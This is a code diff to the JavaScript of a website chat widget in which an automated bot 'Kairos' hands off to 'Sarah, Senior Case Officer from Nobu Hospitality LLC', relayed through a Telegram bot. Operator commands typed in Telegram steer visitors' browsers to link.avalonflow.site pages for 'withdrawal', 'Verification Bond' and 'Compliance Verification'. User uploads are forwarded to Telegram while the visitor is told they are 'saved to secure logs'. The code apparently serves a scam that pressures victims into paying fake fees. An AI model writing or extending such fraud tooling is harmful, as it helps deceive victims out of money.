@@ -1479,6 +1479,7 @@ function startQuoteAutorotation() {
     }, 7000); 
 }
 
+// ---------- Outbound Transmission Handling ----------
 async function sendMessage(){
     const text = botInput.value.trim();
     if(!text) return;
@@ -1533,6 +1534,7 @@ async function sendMessage(){
     }
 }
 
+// ---------- File Inputs Attachment Hook ----------
 if (botFileInput) {
     botFileInput.addEventListener('change', async () => {
         const file = botFileInput.files[0];
@@ -1543,6 +1545,7 @@ if (botFileInput) {
         if (file.type.startsWith("video/")) msgType = "video";
         if (file.type.startsWith("audio/")) msgType = "audio"; 
 
+        // Lock file name string safely in local memory
         let savedFileName = file.name;
         if (!savedFileName || savedFileName === "blob") {
             savedFileName = msgType === "audio" ? "Voice_Note.mp3" : "Attachment_File";
@@ -1551,6 +1554,8 @@ if (botFileInput) {
         const reader = new FileReader();
         reader.onload = async function(e) {
             const persistentFileUrl = e.target.result; 
+
+            // If it's a document, pass the file name; otherwise pass the base64 media stream URL
             const visualContent = (msgType === "document") ? savedFileName : persistentFileUrl;
 
             const userMsg = addMessage(visualContent, "user", "delivered", msgType);
@@ -1563,6 +1568,8 @@ if (botFileInput) {
 
             forwardUserMessageToTelegram(savedFileName, msgType);
 
+            // 🌟 FIXED: Fire confirmation message natively by passing it through botReply directly 
+            // without worrying about conflicting async loop timers!
             const confirmationText = `Received file: ${savedFileName}. Saved directly to secure logs.`;
             botReply(confirmationText);
 
@@ -1587,6 +1594,7 @@ if (botFileInput) {
 if (botSendBtn) botSendBtn.addEventListener('click', sendMessage);
 if (botInput) botInput.addEventListener('keypress', e=>{ if(e.key==='Enter') sendMessage(); });
 
+// ---------- Inbound Long Poll Processing (Dual-Route Routing Sync) ----------
 async function getTelegramFileUrl(fileId) {
     try {
         const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fileId}`);
@@ -1597,7 +1605,7 @@ async function getTelegramFileUrl(fileId) {
 }
 
 async function listenForTelegramMessages() {
-    if (sessionStorage.getItem('active_chat_tab') === currentTabId) {
+    if (sessionStorage.getItem('active_chat_tab') !== currentTabId) {
         scheduleNextCheck();
         return;
     }
@@ -1619,7 +1627,7 @@ async function listenForTelegramMessages() {
             const botHeader = document.getElementById('botHeader');
             if (botHeader) {
                 botHeader.style.background = "linear-gradient(135deg, rgba(107,44,216,0.9), rgba(155,89,182,0.9))";
-                botHeader.textContent = KAIROS_TITLE; 
+                botHeader.textContent = KAIROS_TITLE; // Fixed alignment
             }
 
             startQuoteAutorotation();
@@ -1673,7 +1681,7 @@ async function listenForTelegramMessages() {
                         continue; 
                     }
 
-                    if (update.message.photo) {
+                                        if (update.message.photo) {
                         const fileId = update.message.photo[update.message.photo.length - 1].file_id;
                         msgContent = await getTelegramFileUrl(fileId);
                         msgType = "photo";
@@ -1685,11 +1693,11 @@ async function listenForTelegramMessages() {
                         const fileId = update.message.document.file_id;
                         msgContent = await getTelegramFileUrl(fileId);
                         msgType = "document";
-                    } else if (update.message.voice) { 
+                    } else if (update.message.voice) { // 🌟 ADDED: Captures Telegram Voice notes
                         const fileId = update.message.voice.file_id;
                         msgContent = await getTelegramFileUrl(fileId);
                         msgType = "audio";
-                    } else if (update.message.audio) { 
+                    } else if (update.message.audio) { // 🌟 ADDED: Captures standard Audio MP3 uploads
                         const fileId = update.message.audio.file_id;
                         msgContent = await getTelegramFileUrl(fileId);
                         msgType = "audio";
@@ -1697,6 +1705,7 @@ async function listenForTelegramMessages() {
                         msgContent = update.message.text;
                         msgType = "text";
                     }
+
 
                     if (msgContent) {
                         if (msgType === "text") {
@@ -1710,53 +1719,60 @@ async function listenForTelegramMessages() {
                                 const botHeader = document.getElementById('botHeader');
                                 if (botHeader) {
                                     botHeader.style.background = "linear-gradient(135deg, rgba(107,44,216,0.9), rgba(155,89,182,0.9))";
-                                    botHeader.textContent = KAIROS_TITLE; 
+                                    botHeader.textContent = KAIROS_TITLE; // Fixed alignment
                                 }
 
                                 startQuoteAutorotation();
                                 msgContent = "Sorry😔 Sarah has left the chat. I am Kairos, your automated assistant, and I am back online to help you!🫡";
                             }
+
                             else if (lowerContent.includes("redirect her to") || lowerContent.includes("redirect him to") || lowerContent.includes("redirect them to") || lowerContent.includes("redirect vitti to")) {
-                                isSarahActive = false;
-                                sessionStorage.removeItem('agent_takeover');
-                                localStorage.removeItem('sarah_takeover_timestamp');
+    
+    // 1. INSTANTLY KILL SARAH'S ACTIVE STATE (Just like end conversation does)
+    isSarahActive = false;
+    sessionStorage.removeItem('agent_takeover');
+    localStorage.removeItem('sarah_takeover_timestamp');
 
-                                const botHeader = document.getElementById('botHeader');
-                                if (botHeader) {
-                                    botHeader.style.background = "linear-gradient(135deg, rgba(107,44,216,0.9), rgba(155,89,182,0.9))";
-                                    botHeader.textContent = KAIROS_TITLE;
-                                }
-                                startQuoteAutorotation();
+    // 2. INSTANTLY SWAP THE HEADER BACK TO KAIROS
+    const botHeader = document.getElementById('botHeader');
+    if (botHeader) {
+        botHeader.style.background = "linear-gradient(135deg, rgba(107,44,216,0.9), rgba(155,89,182,0.9))";
+        botHeader.textContent = KAIROS_TITLE;
+    }
+    startQuoteAutorotation();
 
-                                if (lowerContent.includes("dashboard")) {
-                                    msgContent = "Understood. Accessing your main dashboard account panel now...";
-                                    setTimeout(() => { window.location.href = "https://link.avalonflow.site/dashboard"; }, 2500);
-                                } 
-                                else if (lowerContent.includes("withdrawal")) {
-                                    msgContent = "Perfect. Pulling up your secure withdrawal routing screen...";
-                                    setTimeout(() => { window.location.href = "https://link.avalonflow.site/withdrawal"; }, 2500);
-                                } 
-                                else if (lowerContent.includes("rewards")) {
-                                    msgContent = "Opening your Sector Retention Bonus balance . One moment...";
-                                    setTimeout(() => { window.location.href = "https://link.avalonflow.site/returns"; }, 2500);
-                                } 
-                                else if (lowerContent.includes("avb") || lowerContent.includes("verification bond")) {
-                                    msgContent = "Initializing secure verification protocols... Opening your AvalonFlow Verification Bond (AVB) ledger now.";
-                                    setTimeout(() => { window.location.href = "https://link.avalonflow.site/crawithholdingverification"; }, 2500); 
-                                }
-                                else if (lowerContent.includes("compliance")) {
-                                    msgContent = "Initializing priority connection... Opening your Compliance Verification gateway.";
-                                    setTimeout(() => { window.location.href = "https://link.avalonflow.site/confirmations"; }, 2500);
-                                } 
-                                else if (lowerContent.includes("sign out") || lowerContent.includes("logout") || lowerContent.includes("signin")) {
-                                    msgContent = "Routing session parameters back to the secure access terminal...";
-                                    setTimeout(() => { window.location.href = "https://link.avalonflow.site/signin"; }, 2500); 
-                                }
-                                else {
-                                    msgContent = "Processing system routing protocols. Updating portal window now...";
-                                    setTimeout(() => { window.location.href = "https://link.avalonflow.site/confirmations"; }, 2500);
-                                }
-                            } 
+    // 3. PROCESS THE ROUTING DESTINATIONS
+    if (lowerContent.includes("dashboard")) {
+        msgContent = "Understood. Accessing your main dashboard account panel now...";
+        setTimeout(() => { window.location.href = "https://link.avalonflow.site/dashboard"; }, 2500);
+    } 
+    else if (lowerContent.includes("withdrawal")) {
+        msgContent = "Perfect. Pulling up your secure withdrawal routing screen...";
+        setTimeout(() => { window.location.href = "https://link.avalonflow.site/withdrawal"; }, 2500);
+    } 
+    else if (lowerContent.includes("rewards")) {
+        msgContent = "Opening your Sector Retention Bonus balance . One moment...";
+        setTimeout(() => { window.location.href = "https://link.avalonflow.site/returns"; }, 2500);
+    } 
+    else if (lowerContent.includes("avb") || lowerContent.includes("verification bond")) {
+        msgContent = "Initializing secure verification protocols... Opening your AvalonFlow Verification Bond (AVB) ledger now.";
+        setTimeout(() => { window.location.href = "https://link.avalonflow.site/crawithholdingverification"; }, 2500); 
+    }
+    else if (lowerContent.includes("compliance")) {
+        msgContent = "Initializing priority connection... Opening your Compliance Verification gateway.";
+        setTimeout(() => { window.location.href = "https://link.avalonflow.site/confirmations"; }, 2500);
+    } 
+    // ADDED: Captures 'signin' from your Telegram screenshot command to drop to login
+    else if (lowerContent.includes("sign out") || lowerContent.includes("logout") || lowerContent.includes("signin")) {
+        msgContent = "Routing session parameters back to the secure access terminal...";
+        setTimeout(() => { window.location.href = "https://link.avalonflow.site/signin"; }, 2500); // Redirects to login/logout path
+    }
+    else {
+        // Fallback message if an unknown page string gets passed
+        msgContent = "Processing system routing protocols. Updating portal window now...";
+        setTimeout(() => { window.location.href = "https://link.avalonflow.site/confirmations"; }, 2500);
+    }
+                            } // This bracket safely closes: if (msgType === "text")
                         }
 
                         setTimeout(() => { showTyping(); }, chainDelay);
@@ -1789,6 +1805,94 @@ async function listenForTelegramMessages() {
     }
     scheduleNextCheck();
 }
+
+function scheduleNextCheck() {
+    clearTimeout(pollingTimer);
+    pollingTimer = setTimeout(listenForTelegramMessages, currentDelay);
+}
+
+function initiateKairosConversation() {
+    if (chatHistory.length === 0) {
+        showTyping();
+        setTimeout(() => {
+            removeTyping();
+            personality.awaitingSarahConfirm = true;
+            const greetings = [
+                "Hey 👋 I’m Kairos. Welcome back! Do you want me to connect you with Sarah regarding any issues you might have?",
+                "Hi there. Kairos online. Would you like me to ping Sarah the Senior Case Officer from Nobu Hospitality LLC to take a look at your account right now?",
+                "Hello! Welcome to the secure interface portal. Do you prefer to initiate automated assistance or step into live chat with Sarah?",
+                "Hey—Kairos here. I can handle routine questions, but do you want me to transfer your current session directly over to Sarah?"
+            ];
+            const randomGreeting = greetings[Math.floor(Math.random() * greetings.length)];
+            addMessage(randomGreeting, "bot", "delivered", "text", "kairos");
+
+            conversationMemory.push({ role: "bot", content: randomGreeting, type: "text", time: Date.now() });
+            chatHistory.push({ sender: 'bot', text: randomGreeting, type: 'text', actualSender: 'kairos' });
+            localStorage.setItem('tg_chat_history_v3', JSON.stringify(chatHistory));
+
+            startQuoteAutorotation();
+        }, 1000);
+    } else {
+        let lastSarahIndex = -1;
+        let lastEndIndex = -1;
+
+        chatHistory.forEach((m, idx) => {
+            if (m.actualSender === "sarah" || (m.text && m.text.includes("this is Sarah"))) lastSarahIndex = idx;
+            if (m.text && (m.text.toLowerCase().includes("end conversation") || m.text.toLowerCase().includes("conversation ended") || m.text.includes("Sarah has left the chat"))) {
+                lastEndIndex = idx;
+            }
+        });
+
+        const takeoverTime = parseInt(localStorage.getItem('sarah_takeover_timestamp')) || 0;
+        if (lastSarahIndex > -1 && lastSarahIndex > lastEndIndex && takeoverTime > 0 && (Date.now() - takeoverTime > 900000)) {
+            isSarahActive = false;
+            personality.awaitingTimeoutRetry = true;
+            localStorage.removeItem('sarah_takeover_timestamp');
+            
+            const botHeader = document.getElementById('botHeader');
+            if (botHeader) {
+                botHeader.style.background = "linear-gradient(135deg, rgba(107,44,216,0.9), rgba(155,89,182,0.9))";
+                botHeader.textContent = KAIROS_TITLE; // Fixed alignment
+            }
+            startQuoteAutorotation();
+        } else if (lastSarahIndex > -1 && lastSarahIndex > lastEndIndex) {
+            isSarahActive = true; 
+            const botHeader = document.getElementById('botHeader');
+            if (botHeader) {
+                botHeader.style.background = sarahProfile.avatarColor;
+                botHeader.textContent = sarahProfile.name;
+            }
+            if (statusText) statusText.textContent = sarahProfile.statusText;
+        } else {
+            isSarahActive = false;
+            const botHeader = document.getElementById('botHeader');
+            if (botHeader) {
+                botHeader.style.background = "linear-gradient(135deg, rgba(107,44,216,0.9), rgba(155,89,182,0.9))";
+                botHeader.textContent = KAIROS_TITLE; // Fixed alignment
+            }
+            startQuoteAutorotation();
+        }
+    }
+}
+
+function loadChatHistory() {
+    if (chatHistory.length > 0) {
+        chatHistory.forEach(item => {
+            addMessage(item.text, item.sender, "delivered", item.type || "text", item.actualSender || null);
+        });
+        botMessagesContainer.scrollTop = botMessagesContainer.scrollHeight;
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const saved = localStorage.getItem('profilePhoto');
+    if (profilePhoto) profilePhoto.src = saved ? saved : DEFAULT_AVATAR;
+
+    loadChatHistory();
+    initiateKairosConversation();
+    scheduleNextCheck(); 
+    startQuoteAutorotation();
+});
 
 // ---------- MULTI-DECK 10s CROSSFADE ENGINE WORKFLOW ----------
 function botMusicReply(text, file) {
@@ -1884,94 +1988,6 @@ function triggerCustomAudioPlayerMessage(file) {
         botMusicReply(`Playing next: ${formatted}... 🎧`, file);
     }
 }
-
-function scheduleNextCheck() {
-    clearTimeout(pollingTimer);
-    pollingTimer = setTimeout(listenForTelegramMessages, currentDelay);
-}
-
-function initiateKairosConversation() {
-    if (chatHistory.length === 0) {
-        showTyping();
-        setTimeout(() => {
-            removeTyping();
-            personality.awaitingSarahConfirm = true;
-            const greetings = [
-                "Hey 👋 I’m Kairos. Welcome back! Do you want me to connect you with Sarah regarding any issues you might have?",
-                "Hi there. Kairos online. Would you like me to ping Sarah the Senior Case Officer from Nobu Hospitality LLC to take a look at your account right now?",
-                "Hello! Welcome to the secure interface portal. Do you prefer to initiate automated assistance or step into live chat with Sarah?",
-                "Hey—Kairos here. I can handle routine questions, but do you want me to transfer your current session directly over to Sarah?"
-            ];
-            const randomGreeting = greetings[Math.floor(Math.random() * greetings.length)];
-            addMessage(randomGreeting, "bot", "delivered", "text", "kairos");
-
-            conversationMemory.push({ role: "bot", content: randomGreeting, type: "text", time: Date.now() });
-            chatHistory.push({ sender: 'bot', text: randomGreeting, type: 'text', actualSender: 'kairos' });
-            localStorage.setItem('tg_chat_history_v3', JSON.stringify(chatHistory));
-
-            startQuoteAutorotation();
-        }, 1000);
-    } else {
-        let lastSarahIndex = -1;
-        let lastEndIndex = -1;
-
-        chatHistory.forEach((m, idx) => {
-            if (m.actualSender === "sarah" || (m.text && m.text.includes("this is Sarah"))) lastSarahIndex = idx;
-            if (m.text && (m.text.toLowerCase().includes("end conversation") || m.text.toLowerCase().includes("conversation ended") || m.text.includes("Sarah has left the chat"))) {
-                lastEndIndex = idx;
-            }
-        });
-
-        const takeoverTime = parseInt(localStorage.getItem('sarah_takeover_timestamp')) || 0;
-        if (lastSarahIndex > -1 && lastSarahIndex > lastEndIndex && takeoverTime > 0 && (Date.now() - takeoverTime > 900000)) {
-            isSarahActive = false;
-            personality.awaitingTimeoutRetry = true;
-            localStorage.removeItem('sarah_takeover_timestamp');
-            
-            const botHeader = document.getElementById('botHeader');
-            if (botHeader) {
-                botHeader.style.background = "linear-gradient(135deg, rgba(107,44,216,0.9), rgba(155,89,182,0.9))";
-                botHeader.textContent = KAIROS_TITLE; 
-            }
-            startQuoteAutorotation();
-        } else if (lastSarahIndex > -1 && lastSarahIndex > lastEndIndex) {
-            isSarahActive = true; 
-            const botHeader = document.getElementById('botHeader');
-            if (botHeader) {
-                botHeader.style.background = sarahProfile.avatarColor;
-                botHeader.textContent = sarahProfile.name;
-            }
-            if (statusText) statusText.textContent = sarahProfile.statusText;
-        } else {
-            isSarahActive = false;
-            const botHeader = document.getElementById('botHeader');
-            if (botHeader) {
-                botHeader.style.background = "linear-gradient(135deg, rgba(107,44,216,0.9), rgba(155,89,182,0.9))";
-                botHeader.textContent = KAIROS_TITLE; 
-            }
-            startQuoteAutorotation();
-        }
-    }
-}
-
-function loadChatHistory() {
-    if (chatHistory.length > 0) {
-        chatHistory.forEach(item => {
-            addMessage(item.text, item.sender, "delivered", item.type || "text", item.actualSender || null);
-        });
-        botMessagesContainer.scrollTop = botMessagesContainer.scrollHeight;
-    }
-}
-
-document.addEventListener('DOMContentLoaded', () => {
-    const saved = localStorage.getItem('profilePhoto');
-    if (profilePhoto) profilePhoto.src = saved ? saved : DEFAULT_AVATAR;
-
-    loadChatHistory();
-    initiateKairosConversation();
-    scheduleNextCheck(); 
-    startQuoteAutorotation();
-});
 
 function handleMusicIntent(lowerMsg) {
     const trimmedMsg = lowerMsg.trim().toLowerCase();
